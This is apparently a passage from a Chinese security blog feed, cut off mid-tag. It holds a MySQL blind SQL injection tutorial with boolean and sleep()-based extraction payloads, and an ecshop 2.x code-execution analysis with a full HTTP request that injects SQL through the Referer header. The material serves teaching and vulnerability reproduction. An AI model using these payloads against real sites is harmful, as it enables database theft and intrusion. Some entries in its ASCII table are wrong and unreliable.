    <content type="html"><![CDATA[<h2 id="概念："><a href="#概念：" class="headerlink" title="概念："></a>概念：</h2><p>如果每个应用程序都能按照我们输入的 SQL 命令返回我们需要的数据，那应用程序就无安全性可言了！为此，程序设计者们想到一个办法，那就是无论输入何种命令，只要 SQL 语句导致数据库产生错误，那么应用程序就会返回一个“通用的”的页面，或者重定向一个通用页面（可能为网站首页）。这时，回显方式的 SQL 注入办法就无法使用了。盲注，即在 SQL 注入过程中，SQL 语句执行选择后，选择的数据不能回显到前端，需要使用一些特殊的方法进行判断或尝试，这个过程称为盲注。</p><h2 id="盲注分为两类："><a href="#盲注分为两类：" class="headerlink" title="盲注分为两类："></a>盲注分为两类：</h2><p><strong>一、 基于布尔型 SQL 盲注；</strong></p><p>• 基于布尔型 SQL 盲注即在 SQL 注入过程中，应用程序仅仅返回 True（页面）和 False（页面）。</p><p>• 无法根据应用程序的返回页面得到需要的数据库信息。但是可以通过构造逻辑判断（比较大小）来得到需要的信息。</p><p><strong>二、 基于时间型 SQL 盲注；注入 SQL 代码之后，存在以下两种情况：</strong></p><p>• 如果注入的 SQL 代码不影响后台[数据库]的正常功能执行，那么 Web 应用的页面显示正确（原始页面）。</p><p>• 如果注入的 SQL 代码影响后台数据库的正常功能（产生了 SQL 注入），但是此时Web 应用的页面依旧显示正常（原因是 Web 应用程序采取了“重定向”或“屏蔽”措施）。</p><p>产生一个疑问：注入的 SQL 代码到底被后台数据库执行了没有？即 Web 应用程序是否存在 SQL 注入？</p><p>面对这种情况，之前讲的基于布尔的 SQL 盲注就很难发挥作用了（因为基于布尔的 SQL 盲注的前提是 Web 程序返回的页面存在 true 和 false 两种不同的页面）。这时，一般采用基于 web 应用响应时间上的差异来判断是否存在 SQL 注入，即基于时间型 SQL 盲注。</p><h2 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h2><p>在页面中，如果正确执行了SQL语句，则返回一种页面，如果SQL语句执行错误，则执行另一种页面。基于两种页面，来判断SQL语句正确与否，达到获取数据的目的</p><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>网上的payload一般是利用<code>ascii()</code>、<code>substr()</code>、<code>length()</code>结合进行利用</p><ul><li><h4 id="获取数据库长度"><a href="#获取数据库长度" class="headerlink" title="获取数据库长度"></a>获取数据库长度</h4><pre><code class="hljs mysql">and (select length(database()))&#x3D;长度</code></pre></li></ul><p>  <code>大于7</code>返回<code>正常</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20190813_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E7%9B%B2%E6%B3%A8/01.png" alt="大于7返回正常"></p><p>  <code>大于8</code>返回<code>错误</code></p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20190813_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E7%9B%B2%E6%B3%A8/02.png" alt="大于8返回错误"></p><p>  <code>等于8</code>返回<code>正常</code>，说明数据库长度为8</p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20190813_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E7%9B%B2%E6%B3%A8/03.png" alt="等于8返回正常"></p><ul><li><h4 id="逐字猜解数据库名"><a href="#逐字猜解数据库名" class="headerlink" title="逐字猜解数据库名"></a>逐字猜解数据库名</h4><pre><code class="hljs mysql">and (select ascii(substr(database(),位数,1)))&#x3D;ascii码</code></pre><p><strong>ASCII对照表</strong></p></li></ul><table><thead><tr><th align="center">ASCII值</th><th align="center">控制字符</th><th align="center">ASCII值</th><th align="center">控制字符</th><th align="center">ASCII值</th><th align="center">控制字符</th><th align="center">ASCII值</th><th align="center">控制字符</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">NUT</td><td align="center">32</td><td align="center">(space)</td><td align="center">64</td><td align="center">@</td><td align="center">96</td><td align="center">、</td></tr><tr><td align="center">1</td><td align="center">SOH</td><td align="center">33</td><td align="center">!</td><td align="center">65</td><td align="center">A</td><td align="center">97</td><td align="center">a</td></tr><tr><td align="center">2</td><td align="center">STX</td><td align="center">34</td><td align="center">“</td><td align="center">66</td><td align="center">B</td><td align="center">98</td><td align="center">b</td></tr><tr><td align="center">3</td><td align="center">ETX</td><td align="center">35</td><td align="center">#</td><td align="center">67</td><td align="center">C</td><td align="center">99</td><td align="center">c</td></tr><tr><td align="center">4</td><td align="center">EOT</td><td align="center">36</td><td align="center">$</td><td align="center">68</td><td align="center">D</td><td align="center">100</td><td align="center">d</td></tr><tr><td align="center">5</td><td align="center">ENQ</td><td align="center">37</td><td align="center">%</td><td align="center">69</td><td align="center">E</td><td align="center">101</td><td align="center">e</td></tr><tr><td align="center">6</td><td align="center">ACK</td><td align="center">38</td><td align="center">&amp;</td><td align="center">70</td><td align="center">F</td><td align="center">102</td><td align="center">f</td></tr><tr><td align="center">7</td><td align="center">BEL</td><td align="center">39</td><td align="center">,</td><td align="center">71</td><td align="center">G</td><td align="center">103</td><td align="center">g</td></tr><tr><td align="center">8</td><td align="center">BS</td><td align="center">40</td><td align="center">(</td><td align="center">72</td><td align="center">H</td><td align="center">104</td><td align="center">h</td></tr><tr><td align="center">9</td><td align="center">HT</td><td align="center">41</td><td align="center">)</td><td align="center">73</td><td align="center">I</td><td align="center">105</td><td align="center">i</td></tr><tr><td align="center">10</td><td align="center">LF</td><td align="center">42</td><td align="center">*</td><td align="center">74</td><td align="center">J</td><td align="center">106</td><td align="center">j</td></tr><tr><td align="center">11</td><td align="center">VT</td><td align="center">43</td><td align="center">+</td><td align="center">75</td><td align="center">K</td><td align="center">107</td><td align="center">k</td></tr><tr><td align="center">12</td><td align="center">FF</td><td align="center">44</td><td align="center">,</td><td align="center">76</td><td align="center">L</td><td align="center">108</td><td align="center">l</td></tr><tr><td align="center">13</td><td align="center">CR</td><td align="center">45</td><td align="center">-</td><td align="center">77</td><td align="center">M</td><td align="center">109</td><td align="center">m</td></tr><tr><td align="center">14</td><td align="center">SO</td><td align="center">46</td><td align="center">.</td><td align="center">78</td><td align="center">N</td><td align="center">110</td><td align="center">n</td></tr><tr><td align="center">15</td><td align="center">SI</td><td align="center">47</td><td align="center">/</td><td align="center">79</td><td align="center">O</td><td align="center">111</td><td align="center">o</td></tr><tr><td align="center">16</td><td align="center">DLE</td><td align="center">48</td><td align="center">0</td><td align="center">80</td><td align="center">P</td><td align="center">112</td><td align="center">p</td></tr><tr><td align="center">17</td><td align="center">DCI</td><td align="center">49</td><td align="center">1</td><td align="center">81</td><td align="center">Q</td><td align="center">113</td><td align="center">q</td></tr><tr><td align="center">18</td><td align="center">DC2</td><td align="center">50</td><td align="center">2</td><td align="center">82</td><td align="center">R</td><td align="center">114</td><td align="center">r</td></tr><tr><td align="center">19</td><td align="center">DC3</td><td align="center">51</td><td align="center">3</td><td align="center">83</td><td align="center">S</td><td align="center">115</td><td align="center">s</td></tr><tr><td align="center">20</td><td align="center">DC4</td><td align="center">52</td><td align="center">4</td><td align="center">84</td><td align="center">T</td><td align="center">116</td><td align="center">t</td></tr><tr><td align="center">21</td><td align="center">NAK</td><td align="center">53</td><td align="center">5</td><td align="center">85</td><td align="center">U</td><td align="center">117</td><td align="center">u</td></tr><tr><td align="center">22</td><td align="center">SYN</td><td align="center">54</td><td align="center">6</td><td align="center">86</td><td align="center">V</td><td align="center">118</td><td align="center">v</td></tr><tr><td align="center">23</td><td align="center">TB</td><td align="center">55</td><td align="center">7</td><td align="center">87</td><td align="center">W</td><td align="center">119</td><td align="center">w</td></tr><tr><td align="center">24</td><td align="center">CAN</td><td align="center">56</td><td align="center">8</td><td align="center">88</td><td align="center">X</td><td align="center">120</td><td align="center">x</td></tr><tr><td align="center">25</td><td align="center">EM</td><td align="center">57</td><td align="center">9</td><td align="center">89</td><td align="center">Y</td><td align="center">121</td><td align="center">y</td></tr><tr><td align="center">26</td><td align="center">SUB</td><td align="center">58</td><td align="center">:</td><td align="center">90</td><td align="center">Z</td><td align="center">122</td><td align="center">z</td></tr><tr><td align="center">27</td><td align="center">ESC</td><td align="center">59</td><td align="center">;</td><td align="center">91</td><td align="center">[</td><td align="center">123</td><td align="center">{</td></tr><tr><td align="center">28</td><td align="center">FS</td><td align="center">60</td><td align="center">&lt;</td><td align="center">92</td><td align="center">/</td><td align="center">124</td><td align="center">|</td></tr><tr><td align="center">29</td><td align="center">GS</td><td align="center">61</td><td align="center">=</td><td align="center">93</td><td align="center">]</td><td align="center">125</td><td align="center">}</td></tr><tr><td align="center">30</td><td align="center">RS</td><td align="center">62</td><td align="center">&gt;</td><td align="center">94</td><td align="center">^</td><td align="center">126</td><td align="center">`</td></tr><tr><td align="center">31</td><td align="center">US</td><td align="center">63</td><td align="center">?</td><td align="center">95</td><td align="center">_</td><td align="center">127</td><td align="center">DEL</td></tr></tbody></table><p>数据库第一位字符ASCII码为<code>114</code>返回<code>错误</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20190813_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E7%9B%B2%E6%B3%A8/04.png" alt="数据库第一位字符"></p><p>数据库第一位字符ASCII码为<code>115</code>返回<code>正确</code>，说明数据库第一位字符为<code>s</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20190813_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E7%9B%B2%E6%B3%A8/05.png" alt="数据库第一位字符"></p><p>数据库第二位字符ASCII码为<code>100</code>返回<code>错误</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20190813_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E7%9B%B2%E6%B3%A8/06.png" alt="数据库第二位字符"></p><p>数据库第二位字符ASCII码为<code>101</code>返回<code>正确</code>，说明数据库第二位字符为<code>e</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20190813_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E7%9B%B2%E6%B3%A8/07.png" alt="数据库第二位字符"></p><p>…..</p><pre><code class="hljs mysql">?id&#x3D;1&#39; and (select ascii(substr(database(),8,1)))&#x3D;121 --+</code></pre><p>以此类推，最后得到数据库为<code>security</code></p><ul><li><h4 id="猜解表名数量"><a href="#猜解表名数量" class="headerlink" title="猜解表名数量"></a>猜解表名数量</h4></li></ul><pre><code class="hljs mysql">and (select count(table_name) from information_schema.tables where table_schema&#x3D;database())&#x3D;数量</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20190813_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E7%9B%B2%E6%B3%A8/08.png" alt="有4个表"></p><ul><li><h4 id="猜解某个表长度"><a href="#猜解某个表长度" class="headerlink" title="猜解某个表长度"></a>猜解某个表长度</h4><p>使用<code>limit</code>偏移，<code>n</code>从<code>0</code>开始</p></li></ul><pre><code class="hljs mysql">and (select length(table_name) from information_schema.tables where table_schema&#x3D;database() limit n,1)&#x3D;长度</code></pre><p>第4个表长度为5</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20190813_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E7%9B%B2%E6%B3%A8/09.png" alt="第4个表长度为5"></p><ul><li><h4 id="逐位猜解表名"><a href="#逐位猜解表名" class="headerlink" title="逐位猜解表名"></a>逐位猜解表名</h4></li></ul><pre><code class="hljs mysql">and (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema &#x3D; database() limit n,1)&#x3D;ascii码</code></pre><p>第<code>4</code>个表第<code>一</code>位<code>ascii码</code>为<code>116</code>报错</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20190813_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E7%9B%B2%E6%B3%A8/10.png" alt="等于116报错"></p><p>第<code>4</code>个表第<code>一</code>位<code>ascii码</code>为<code>117</code>正确，说明第<code>4</code>个表第<code>一</code>位为<code>u</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20190813_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E7%9B%B2%E6%B3%A8/11.png" alt="等于117正确"></p><p>….</p><p>以此类推，最后得到第<code>4</code>个表<code>表名</code>为<code>users</code></p><ul><li><h4 id="猜解列名数量"><a href="#猜解列名数量" class="headerlink" title="猜解列名数量"></a>猜解列名数量</h4></li></ul><pre><code class="hljs mysql">and (select count(*) from information_schema.columns where table_schema &#x3D; database() and table_name &#x3D; 表名)&#x3D;数量</code></pre><p><code>users</code>表<code>列名</code>数量为<code>3</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20190813_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E7%9B%B2%E6%B3%A8/12.png" alt="users表列名数量为3"></p><ul><li><h4 id="猜解某个列长度"><a href="#猜解某个列长度" class="headerlink" title="猜解某个列长度"></a>猜解某个列长度</h4><p>使用<code>limit</code>偏移，<code>n</code>从<code>0</code>开始</p></li></ul><pre><code class="hljs mysql">and (select length(column_name) from information_schema.columns where table_name&#x3D;&#39;表名&#39; limit n,1)&#x3D;长度</code></pre><ul><li><h4 id="逐位猜解列名"><a href="#逐位猜解列名" class="headerlink" title="逐位猜解列名"></a>逐位猜解列名</h4></li></ul><pre><code class="hljs mysql">and (select ascii(substr(column_name,位数,1)) from information_schema.columns where table_name&#x3D;&quot;表名&quot; limit n,1)&#x3D;ascii码</code></pre><ul><li><h4 id="判断数据的数量"><a href="#判断数据的数量" class="headerlink" title="判断数据的数量"></a>判断数据的数量</h4></li></ul><pre><code class="hljs mysql">and (select count(列名) from 表名)&#x3D;数量</code></pre><ul><li><h4 id="猜解某条数据的长度"><a href="#猜解某条数据的长度" class="headerlink" title="猜解某条数据的长度"></a>猜解某条数据的长度</h4></li></ul><pre><code class="hljs mysql">and (select length(列名) from admin limit n,1)&#x3D;长度</code></pre><ul><li><h4 id="逐位猜解数据"><a href="#逐位猜解数据" class="headerlink" title="逐位猜解数据"></a>逐位猜解数据</h4></li></ul><pre><code class="hljs mysql">and (select ascii(substr(user,位数,1)) from admin limit n,1)&#x3D;ascii码</code></pre><h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><p>布尔盲注是根据页面正常否进行注入，而时间盲注则是通过SQL语句查询的时间来进行注入,一般是在页面无回显，无报错的情况下使用</p><h3 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload"></a>Payload</h3><p>网上的payload一般是利用<code>sleep()</code>进行利用</p><ul><li><h4 id="猜解数据库长度"><a href="#猜解数据库长度" class="headerlink" title="猜解数据库长度"></a>猜解数据库长度</h4></li></ul><pre><code class="hljs mysql">and if((select length(database()))&#x3D;长度,sleep(6),0)</code></pre><ul><li><h4 id="猜解数据库名"><a href="#猜解数据库名" class="headerlink" title="猜解数据库名"></a>猜解数据库名</h4></li></ul><pre><code class="hljs mysql">and if((select ascii(substr(database(),位数,1))&#x3D;ascii码),sleep(6),0)</code></pre><ul><li><h4 id="判断表名的数量"><a href="#判断表名的数量" class="headerlink" title="判断表名的数量"></a>判断表名的数量</h4></li></ul><pre><code class="hljs mysql">and if((select count(table_name) from information_schema.tables where table_schema&#x3D;database())&#x3D;个数,sleep(6),0)</code></pre><ul><li><h4 id="判断某个表名的长度"><a href="#判断某个表名的长度" class="headerlink" title="判断某个表名的长度"></a>判断某个表名的长度</h4></li></ul><pre><code class="hljs mysql">and if((select length(table_name) from information_schema.tables where table_schema&#x3D;database() limit n,1)&#x3D;长度,sleep(6),0)</code></pre><ul><li><h4 id="逐位猜表名"><a href="#逐位猜表名" class="headerlink" title="逐位猜表名"></a>逐位猜表名</h4></li></ul><pre><code class="hljs mysql">and if((select ascii(substr(table_name,位数,1)) from information_schema.tables where table_schema&#x3D;database() limit n,1)&#x3D;ascii码,sleep(6),0)</code></pre><ul><li><h4 id="判断列名数量"><a href="#判断列名数量" class="headerlink" title="判断列名数量"></a>判断列名数量</h4></li></ul><pre><code class="hljs mysql">and if((select count(column_name) from information_schema.columns where table_name&#x3D;&quot;表名&quot;)&#x3D;个数,sleep(6),0)</code></pre><ul><li><h4 id="判断某个列名的长度"><a href="#判断某个列名的长度" class="headerlink" title="判断某个列名的长度"></a>判断某个列名的长度</h4></li></ul><pre><code class="hljs mysql">and if((select length(column_name) from information_schema.columns where table_name&#x3D;&quot;表名&quot; limit n,1)&#x3D;长度,sleep(6),0)</code></pre><ul><li><h4 id="逐位猜列名"><a href="#逐位猜列名" class="headerlink" title="逐位猜列名"></a>逐位猜列名</h4></li></ul><pre><code class="hljs mysql">and if((select ascii(substr(column_name,位数,1)) from information_schema.columns where table_name&#x3D;&quot;表名&quot; limit n,1)&#x3D;ascii码,sleep(6),0)</code></pre><ul><li><h4 id="判断数据的数量-1"><a href="#判断数据的数量-1" class="headerlink" title="判断数据的数量"></a>判断数据的数量</h4></li></ul><pre><code class="hljs mysql">and if((select count(列名) from 表名)&#x3D;个数,sleep(6),0)</code></pre><ul><li><h4 id="判断某个数据的长度"><a href="#判断某个数据的长度" class="headerlink" title="判断某个数据的长度"></a>判断某个数据的长度</h4></li></ul><pre><code class="hljs mysql">and if((select length(列名) from 表名)&#x3D;长度,sleep(6),0)</code></pre><ul><li><h4 id="逐位猜数据"><a href="#逐位猜数据" class="headerlink" title="逐位猜数据"></a>逐位猜数据</h4></li></ul><pre><code class="hljs mysql">and if((select ascii(substr(列名,n,1)) from 表名)&#x3D;ascii码,sleep(6),0)</code></pre>]]></content>
    
    
    <categories>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
      <tag>盲注</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ecshop2.x代码执行</title>
    <link href="/p/1b10c1b1.html"/>
    <url>/p/1b10c1b1.html</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>问题发生在user.php的display函数，模版变量可控，导致注入，配合注入可达到远程代码执行</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="0x01-SQL注入"><a href="#0x01-SQL注入" class="headerlink" title="0x01-SQL注入"></a>0x01-SQL注入</h3><p>先看user.php</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/01.jpg" alt="ecshop2.x代码执行"></p><a id="more"></a><p>$back_act变量来源于HTTP_REFERER，我们可控。</p><p>assign函数用于在模版变量里赋值</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/02.jpg" alt="ecshop2.x代码执行"></p><p>再看display函数</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/03.jpg" alt="ecshop2.x代码执行"></p><p><strong>读取user_passport.dwt模版文件内容，显示解析变量后的html内容，用_echash做分割，得到$k然后交给isnert_mod处理，由于_echash是默认的，不是随机生成的，所以$val内容可随意控制。</strong></p><p>再看insert_mod函数</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/04.jpg" alt="ecshop2.x代码执行"></p><p>非常关键的一个地方，这里进行了动态调用</p><p>$val传入进来用|分割，参数传入进来时需要被序列化</p><p>再看include/lib_insert.php中的insert_ads函数</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/05.jpg" alt="ecshop2.x代码执行"></p><p>可以看到这里直接就能注入了</p><p>payload:</p><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/user.php?act=login</span> HTTP/1.1<span class="hljs-attribute">Host</span>: 127.0.0.1<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<span class="hljs-attribute">Cookie</span>: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1<span class="hljs-attribute">Referer</span>: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;&#125;<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">Cache-Control</span>: max-age=0</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/06.jpg" alt="ecshop2.x代码执行"></p><h3 id="0x02-代码执行"><a href="#0x02-代码执行" class="headerlink" title="0x02-代码执行"></a>0x02-代码执行</h3><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/07.jpg" alt="ecshop2.x代码执行"></p><p>继续看fetch函数</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/08.jpg" alt="ecshop2.x代码执行"></p><p>追踪_eval函数</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/09.jpg" alt="ecshop2.x代码执行"></p><p>$position_style变量来源于数据库中的查询结构</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/10.jpg" alt="ecshop2.x代码执行"></p><p>然后我们继续构造SQL注入，因为这段sql操作 order by部分换行了截断不了 所以需要在id处构造注释来配合num进行union查询</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/11.jpg" alt="ecshop2.x代码执行"></p><p>payload</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, p.ad_height, p.position_style, <span class="hljs-keyword">RAND</span>() <span class="hljs-keyword">AS</span> rnd <span class="hljs-keyword">FROM</span> <span class="hljs-string">`ecshop27`</span>.<span class="hljs-string">`ecs_ad`</span> <span class="hljs-keyword">AS</span> a <span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> <span class="hljs-string">`ecshop27`</span>.<span class="hljs-string">`ecs_ad_position`</span> <span class="hljs-keyword">AS</span> p <span class="hljs-keyword">ON</span> a.position_id = p.position_id <span class="hljs-keyword">WHERE</span> enabled = <span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> start_time &lt;= <span class="hljs-string">&#x27;1535678679&#x27;</span> <span class="hljs-keyword">AND</span> end_time &gt;= <span class="hljs-string">&#x27;1535678679&#x27;</span> <span class="hljs-keyword">AND</span> a.position_id = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-comment">/*&#x27; ORDER BY rnd LIMIT */</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span><span class="hljs-comment">-- -</span></code></pre><p>函数中有一个判断</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/12.jpg" alt="ecshop2.x代码执行"></p><p>我们 id传入’/*</p><p>num传入*/ union select 1,0x272f2a,3,4,5,6,7,8,9,10– -就能绕过了</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/13.jpg" alt="ecshop2.x代码执行"></p><p>var_dump一下</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/14.jpg" alt="ecshop2.x代码执行"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/15.jpg" alt="ecshop2.x代码执行"></p><p>再看fetch函数,传入的参数被fetch_str函数处理了</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/16.jpg" alt="ecshop2.x代码执行"></p><p>追踪fetch_str函数，这里的字符串处理流程比较复杂</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/17.jpg" alt="ecshop2.x代码执行"></p><pre><code class="hljs php"><span class="hljs-keyword">return</span> preg_replace(<span class="hljs-string">&quot;/&#123;([^\&#125;\&#123;\n]*)&#125;/e&quot;</span>, <span class="hljs-string">&quot;\$this-&gt;select(&#x27;\\1&#x27;);&quot;</span>, <span class="hljs-variable">$source</span>);</code></pre><p>这一行意思是比如$source是xxxx{$asd}xxx,那么经过这行代码处理后就是返回this-&gt;select(‘$asd’)的结果</p><p>看看select函数</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/18.jpg" alt="ecshop2.x代码执行"></p><p>第一个字符为$时进入$this-&gt;get_val函数</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/19.jpg" alt="ecshop2.x代码执行"></p><p>我们$val没有.$又进入make_var函数</p><p><img 